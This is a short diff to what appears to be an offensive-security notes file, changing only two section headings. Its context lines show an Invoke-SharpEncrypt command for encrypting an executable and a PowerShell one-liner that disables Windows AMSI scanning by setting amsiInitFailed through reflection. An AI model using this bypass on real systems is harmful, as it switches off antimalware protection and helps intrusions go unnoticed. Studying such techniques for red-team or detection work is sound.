@@ -539,14 +539,14 @@ IntPtr.Zero, 0, IntPtr.Zero);
 
 <br>
 
-### 1
+### 1&2
 
 ```csharp
 Invoke-SharpEncrypt -file C:\Path\to\file.exe -password SuperDumperStrongPassword -outfile C:\Path\to\file.enc
 ```
 <br>
 
-### 2
+### 3
 
 ```powershell
 (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
